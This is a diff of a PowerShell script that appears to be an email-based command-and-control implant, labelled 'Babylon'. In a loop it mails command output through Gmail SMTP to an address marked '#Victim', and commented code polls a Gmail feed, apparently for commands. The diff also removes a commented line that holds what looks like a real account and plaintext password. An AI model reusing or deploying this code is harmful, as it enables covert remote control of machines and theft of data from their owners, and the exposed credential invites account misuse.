@@ -146,13 +146,14 @@ while($true){
       try{
         $username = "XXX"
         $password = "YYY"
+	$Sent_To = "ZZZ" #Victim
 
 	[SecureString]$securepassword = $password | ConvertTo-SecureString -AsPlainText -Force 
 	$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securepassword
 	#$Bytes = [System.Text.Encoding]::Unicode.GetBytes($fc)
 	#$EncodedText =[Convert]::ToBase64String($Bytes)	
 	$commands_send_via_gmail = 'VFIZMR'  + $fc + 'RMZIFV' 
-	Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From svhilimem@gmail.com -To vladif@bugsec.com -Subject 'Babylon' -Body $commands_send_via_gmail -Credential $credential
+	Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -From $username -To $Sent_To -Subject 'Babylon' -Body $commands_send_via_gmail -Credential $credential
 	echo "Sleeping ..."
 	Start-Sleep -s 30
 
@@ -170,7 +171,6 @@ while($true){
    	#$webclient = new-object System.Net.WebClient
 
    	# access the rss-feed
-   	#$webclient.Credentials = new-object System.Net.NetworkCredential ("svhilimem@gmail.com", "123123123Vl!")
 
    	# download the rss as xml
    	#[xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")
